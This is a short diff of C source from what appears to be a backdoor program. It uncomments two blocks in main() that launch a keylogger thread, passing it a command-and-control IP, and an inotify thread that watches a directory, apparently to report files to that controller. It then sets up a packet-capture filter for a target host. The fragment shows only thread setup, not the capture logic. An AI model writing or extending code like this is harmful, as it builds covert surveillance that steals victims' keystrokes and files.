@@ -91,7 +91,7 @@ int main(int argc, char **argv){
                 exit(1);
         }
     }
-/*
+
     //keylogger thread
     keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
     strncpy(keylogger_args->cnc_ip, localip, BUFSIZ);
@@ -107,7 +107,7 @@ int main(int argc, char **argv){
     strncpy(inotify_args->directory, directory, BUFSIZ);
     inotify_args->tcp = tcp;
     pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
-*/
+
     //create command
     Filter = InitFilter(targetip,localip,false);
     CreateFilter(Filter, pcapfilter,tcp);
